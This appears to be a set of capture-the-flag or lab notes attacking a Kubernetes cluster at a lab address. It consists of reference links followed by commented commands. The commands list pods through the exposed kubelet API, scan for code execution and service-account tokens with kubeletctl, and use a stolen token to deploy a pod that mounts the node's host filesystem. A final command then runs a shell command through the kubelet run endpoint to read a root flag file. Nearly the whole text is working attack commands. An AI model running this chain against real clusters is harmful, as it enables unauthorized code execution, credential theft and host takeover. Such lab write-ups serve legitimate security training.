https://faun.pub/attacking-kubernetes-clusters-using-the-kubelet-api-abafc36126ca
https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster
https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216

# get list of running pods
curl -k -L https://10.129.230.82:10250/runningpods | python -m json.tool

# use kubletectl to run API commands easier and search for RCE and tokens
./kubeletctl_linux_amd64 -s 10.129.230.82 scan rce
./kubeletctl_linux_amd64 -s 10.129.230.82 scan token

# get more information on nginx pod (specific image it's using)
kubectl --insecure-skip-tls-verify=true --server=https://10.129.230.82:8443 --token="${NGINX_TOKEN}" edit pod nginx

# create pod that uses same image as nginx pod and mounts the node host filesystem instside it
kubectl --insecure-skip-tls-verify=true --server=https://10.129.230.82:8443 --token="${NGINX_TOKEN}" apply -f pod-to-node.yml -n default

# use node filesystem access to retrieve flag
curl -k -d "cmd=cat /root/flag.txt" https://10.129.230.82:10250/run/default/attacker-pod/attacker-pod"

